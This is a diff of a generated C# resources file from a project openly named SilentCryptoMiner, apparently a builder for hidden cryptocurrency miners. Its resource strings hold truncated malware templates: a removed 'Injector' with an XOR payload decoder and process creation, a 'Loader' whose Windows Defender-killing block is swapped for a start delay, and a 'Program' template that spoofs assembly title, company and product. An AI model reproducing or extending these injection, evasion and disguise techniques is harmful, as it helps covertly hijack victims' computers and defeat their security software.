@@ -172,35 +172,6 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &lt;stdio.h&gt;
-        ///#include &lt;stdlib.h&gt;
-        ///#include &lt;windows.h&gt;
-        ///#include &lt;sys/types.h&gt;
-        ///#include &quot;Includes/syscalls.h&quot;
-        ///
-        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
-        ///
-        ///char* cipher(char* data, long dataLen) {
-        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
-        ///	output[dataLen] = 0;
-        ///	for (int i = 0; i &lt; dataLen; i++) {
-        ///		output[i] = data[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
-        ///	}
-        ///	return output;
-        ///}
-        ///
-        ///int main(int argc, char** argv) {
-        ///	PROCESS_INFORMATION p_info;
-        ///	STARTUPINFO s_info = {sizeof(s_info)};
-        ///	LPV [rest of string was truncated]&quot;;.
-        /// </summary>
-        public static string Injector {
-            get {
-                return ResourceManager.GetString("Injector", resourceCulture);
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
         public static byte[] libs {
@@ -229,9 +200,10 @@ namespace SilentCryptoMiner.Properties {
         ///}
         ///
         ///int main(int argc, char** argv) {
-        ///#if DefKillWD
-        ///	PROCESS_INFORMATION p_infowd;
-        ///	STARTUPINFO s_infowd = {siz [rest of string was truncated]&quot;;.
+        ///	Sleep(startDelay * 1000);
+        ///
+        ///	PROCESS_INFORMATION p_info;
+        ///	STARTUPINFO s_i [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Loader {
             get {
@@ -281,15 +253,13 @@ namespace SilentCryptoMiner.Properties {
         ///using System.Security.Principal;
         ///using System.Text;
         ///using System.Threading;
-        ///#if DefDebug
         ///using System.Windows.Forms;
-        ///#endif
         ///
         ///#if DefAssembly
         ///[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         ///[assembly: AssemblyDescription(&quot;%Description%&quot;)]
         ///[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        ///[assembly: Asse [rest of string was truncated]&quot;;.
+        ///[assembly: AssemblyProduct(&quot;%Product% [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Program {
             get {
